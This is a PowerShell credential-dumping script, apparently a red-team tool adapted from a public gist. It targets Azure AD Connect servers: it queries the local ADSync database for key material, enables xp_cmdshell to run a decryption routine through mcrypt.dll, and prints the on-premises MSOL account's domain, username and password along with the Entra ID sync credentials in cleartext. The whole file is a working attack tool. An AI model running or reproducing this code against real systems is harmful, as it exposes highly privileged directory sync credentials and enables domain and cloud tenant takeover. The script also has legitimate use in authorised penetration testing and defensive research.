# Original script by @_xpn_: https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c
# Modified by @NeffIsBack:
# - Added support for Entra ID sync credentials (original source: https://github.com/Gerenios/AADInternals-Endpoints/blob/6af2054705e900b733ba76c6e65bfa6cad2328cc/AADSyncSettings.ps1#L108-L116)

# Function to decrypt the encrypted configuration of the Azure AD Connect sync stuff
function decrypter($crypted, $key_id, $instance_id, $entropy) {
    $script = "add-type -path ''C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'';`$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager;`$km.LoadKeySet([guid]''$entropy'', [guid]''$instance_id'', $key_id);`$key2 = `$null;`$km.GetKey(1, [ref]`$key2);`$decrypted = `$null;`$key2.DecryptBase64ToString(''$crypted'', [ref]`$decrypted);Write-Host `$decrypted"

    $cmd = $client.CreateCommand()
    $cmd.CommandText = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; 
    EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; 
    EXEC xp_cmdshell 'powershell.exe -c `"$script`"'"
    $reader = $cmd.ExecuteReader()

    $decrypted = [string]::Empty

    while ($reader.Read() -eq $true -and $reader.IsDBNull(0) -eq $false) {
        $decrypted += $reader.GetString(0)
    }
    $reader.Close()

    if ($decrypted -eq [string]::Empty) {
        Write-Host "[!] Error using xp_cmdshell to launch our decryption powershell"
        return
    }

    return $decrypted
}

# Create a connection to the localdb instance of Azure AD Connect
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Data Source=(localdb)\.\ADSync2019;Initial Catalog=ADSync"

try {
    $client.Open()
} catch {
    Write-Host "[!] Could not connect to localdb..."
    return
}

# Get the keyset_id, instance_id, and entropy from the mms_server_configuration table
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
if ($reader.Read() -ne $true) {
    Write-Host "[!] Error querying mms_server_configuration"
    return
}

$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

# Get the encrypted data of the MSOL account for the on-prem AD
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
if ($reader.Read() -ne $true) {
    Write-Host "[!] Error querying mms_management_agent for on-prem MSOL credentials"
    return
}

$on_prem_config = $reader.GetString(0)
$on_prem_crypted = $reader.GetString(1)
$reader.Close()

# Decrypt the on-premise MSOL credentials
$msol_on_prem_decrypted = decrypter $on_prem_crypted $key_id $instance_id $entropy

# Get the encrypted data of the Entra ID sync credentials
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE subtype = 'Windows Azure Active Directory (Microsoft)'"
$reader = $cmd.ExecuteReader()
if ($reader.Read() -ne $true) {
    Write-Host "[!] Error querying mms_management_agent for Entra ID sync credentials"
    return
}

$entra_id_config = $reader.GetString(0)
$entra_id_crypted = $reader.GetString(1)
$reader.Close()

# Decrypt the Entra ID sync credentials
$entra_id_decrypted = decrypter $entra_id_crypted $key_id $instance_id $entropy

# Extract the credentials from the decrypted XML configurations
$domain = select-xml -Content $on_prem_config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerText}}
$username = select-xml -Content $on_prem_config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerText}}
$password = select-xml -Content $msol_on_prem_decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host "[*] Credentials incoming..."
Write-Host "On-prem Domain: $($domain.Domain)"
Write-Host "On-prem Username: $($username.Username)"
Write-Host "On-prem Password: $($password.Password)"

# Extract the Entra ID sync credentials
$entra_id_username = ([xml]$entra_id_config).MAConfig.'parameter-values'.parameter[0].'#text'
$entra_id_password = select-xml -Content $entra_id_decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}
Write-Host "[*] Entra ID sync credentials incoming..."
Write-Host "Entra ID Username: $($entra_id_username)"
Write-Host "Entra ID Password: $($entra_id_password.Password)"